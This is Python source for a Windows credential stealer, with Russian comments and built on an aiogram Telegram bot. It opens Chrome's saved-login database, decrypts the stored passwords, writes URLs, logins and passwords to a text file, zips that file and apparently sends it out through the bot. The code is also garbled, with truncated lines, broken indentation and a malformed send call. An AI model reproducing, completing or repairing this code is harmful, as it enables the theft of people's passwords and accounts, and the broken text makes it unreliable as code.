import asyncio
from aiogram import Bot, Dispatcher, executor, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types.callback_query import CallbackQuery
from aiogram.types import ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.utils.exceptions import Throttled

import os
import sqlite3
from win32 import win32crypt
import shutil
import requests
import zipfile
from PIL import ImageGrab

username = os.getlogin()

bot = Bot(tok
storage=MemoryStorage()
dp = Dispatcher(bot, storage=storage)


def Chrome(): # Создаём функцию
    text = 'Passwords Chrome:' + '\n' # Добавим авторов стиллера)
    text += 'URL | LOGIN
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2') # Начинаем работать с sqlite базой
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins') # Вытаскиваем Ссылку, логин, пароль
        
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode() # расшифровываем данные
            login = result[1]
            url = result[0]
            if password != '':
                text += url + ' | ' + login + ' | ' + password + '\n' # Добавляем данный в переменную
    return text
file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+") #Сохраняем данныем в txt файл google_pass
file.write(str(Chrome()) + '\n')
file.close()

zname=r'D:\LOG.zip'
newzip=zipfile.ZipFile(zname,'w')

newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\google_pass.txt')
doc = 'D:\LOG.zip'


bot.send_document, (doc, file))
























async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
